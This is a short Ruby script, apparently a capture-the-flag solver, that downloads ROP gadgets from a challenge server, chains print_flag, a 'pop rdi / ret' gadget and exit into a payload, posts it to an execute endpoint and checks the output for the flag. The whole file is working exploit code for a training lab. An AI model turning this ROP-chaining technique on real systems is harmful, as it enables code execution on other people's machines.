require './libronsolve.rb'

require 'httparty'
require 'yaml'
require 'json'

# Load gadgets
GADGETS = HTTParty.get("#{ get_url() }gadgets").parsed_response.map { |e| [e['name'].gsub(/\(.*/, ''), e] }.to_h

PAYLOAD = [
  GADGETS['print_flag'],
  GADGETS['pop rdi / ret'],
  '0000000000000000',
  GADGETS['exit'],
].map { |e| (e['hex'] ? e['hex'] : e) }.join

out = HTTParty.post(
  "#{ get_url() }execute",
  :body => {
    'code' => PAYLOAD,
  }.to_json,
  :headers => {
    'Content-Type' => 'application/json',
  },
)

if out.parsed_response['error']
  puts "Something went wrong:"
  exit 1
else
  check_flag(out.parsed_response['stdout'], terminate: true)
end
